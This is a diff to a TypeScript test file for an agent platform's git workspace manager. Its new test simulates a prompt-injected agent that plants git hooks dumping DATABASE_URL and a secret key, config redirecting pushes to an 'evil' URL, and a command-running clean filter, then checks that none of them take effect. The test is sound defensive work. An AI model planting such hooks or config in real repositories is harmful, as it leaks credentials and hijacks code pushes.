@@ -1,5 +1,6 @@
 import { beforeAll, describe, expect, it } from "bun:test";
 import { mkdtempSync } from "node:fs";
+import { appendFile, chmod, rm } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import path from "node:path";
 import {
@@ -18,7 +19,7 @@ import { sql } from "drizzle-orm";
 // WORKSPACE_ROOT is read at module load — point it at a scratch dir BEFORE
 // importing the workspace module
 process.env.WORKSPACE_ROOT = mkdtempSync(path.join(tmpdir(), "agrippa-ws-test-"));
-const { GitWorkspaceManager, git, workspaceDirFor } = await import("./workspace");
+const { GitWorkspaceManager, git, platformDirFor, workspaceDirFor } = await import("./workspace");
 const { GitScmService } = await import("./scm");
 
 const TEST_DATABASE_URL = process.env.TEST_DATABASE_URL ?? "postgres://localhost:5432/agrippa_test";
@@ -274,10 +275,75 @@ describe.skipIf(!dbUp)("GitWorkspaceManager + GitScmService (real git)", () => {
     }
   });
 
-  it("falls back to a worktree diff when the base ref is missing", async () => {
+  it("never runs agent-installed hooks or honors agent git config in platform git", async () => {
+    const hostileRunId = crypto.randomUUID();
+    await workspace.checkout(hostileRunId, {
+      repo: { repoConnectionId },
+      access: "readWrite",
+      projectId,
+    });
+    expect(await workspace.isIntact(hostileRunId)).toBe(true);
+    const dir = workspaceDirFor(hostileRunId);
+
+    // legitimate agent work, left uncommitted so push's finalizing commit runs
+    await Bun.write(path.join(dir, "feature.ts"), "export const ok = true;\n");
+
+    // a prompt-injected agent weaponizes its workspace: hooks that exfiltrate
+    // the worker env, config that redirects the push URL, and a clean filter
+    const hook = `#!/bin/sh\nprintf '%s' "$DATABASE_URL$AGRIPPA_SECRET_KEY" > "${dir}/hook-leak.txt"\ntouch "${dir}/hook-ran.txt"\n`;
+    for (const name of ["pre-commit", "post-commit", "pre-push", "post-checkout"]) {
+      const hookPath = path.join(dir, ".git", "hooks", name);
+      await Bun.write(hookPath, hook);
+      await chmod(hookPath, 0o755);
+    }
+    await appendFile(
+      path.join(dir, ".git", "config"),
+      `[core]\n\thooksPath = ${path.join(dir, ".git", "hooks")}\n` +
+        `[url "file:///nonexistent-evil"]\n\tinsteadOf = file://\n` +
+        `[filter "steal"]\n\tclean = touch '${dir}/filter-ran.txt' && cat\n`,
+    );
+    await Bun.write(path.join(dir, ".gitattributes"), "*.ts filter=steal\n");
+
+    // the whole platform write-path: evidence, branch, finalize commit, push
+    const diff = await workspace.diff(hostileRunId);
+    expect(diff).toContain("feature.ts");
+    const branch = "agrippa/run-3-cafe0123beef";
+    await scm.createBranch(hostileRunId, branch);
+    await scm.push(hostileRunId, { projectId, repo: { repoConnectionId }, branch });
+
+    // the push landed at the REAL origin — insteadOf did not redirect it
+    const shown = Bun.spawnSync(["git", "show", `${branch}:feature.ts`], {
+      cwd: sourceDir,
+      stdout: "pipe",
+      stderr: "pipe",
+    });
+    expect(shown.exitCode).toBe(0);
+    // no hook and no filter ever executed, so nothing leaked
+    expect(await Bun.file(path.join(dir, "hook-ran.txt")).exists()).toBe(false);
+    expect(await Bun.file(path.join(dir, "hook-leak.txt")).exists()).toBe(false);
+    expect(await Bun.file(path.join(dir, "filter-ran.txt")).exists()).toBe(false);
+    // and the agent's config rewrite was replaced by the provision snapshot
+    const config = await Bun.file(path.join(dir, ".git", "config")).text();
+    expect(config).not.toContain("nonexistent-evil");
+    expect(config).not.toContain("hooksPath");
+  });
+
+  it("reports a never-checked-out workspace as not intact", async () => {
+    expect(await workspace.isIntact(crypto.randomUUID())).toBe(false);
+  });
+
+  it("ignores agent tampering with the base ref — the sidecar SHA anchors evidence", async () => {
     const dir = workspaceDirFor(runId);
     await git(["update-ref", "-d", "refs/agrippa/base"], dir);
     await Bun.write(path.join(dir, "uncommitted.txt"), "worktree only\n");
+
+    const diff = await workspace.diff(runId);
+    expect(diff).toContain("uncommitted.txt");
+    expect(diff).toContain("committed line"); // committed work stays in evidence
+  });
+
+  it("falls back to a worktree diff for pre-sidecar workspaces", async () => {
+    await rm(platformDirFor(runId), { recursive: true, force: true });
 
     const diff = await workspace.diff(runId);
     expect(diff).toContain("uncommitted.txt"); // worktree changes still visible
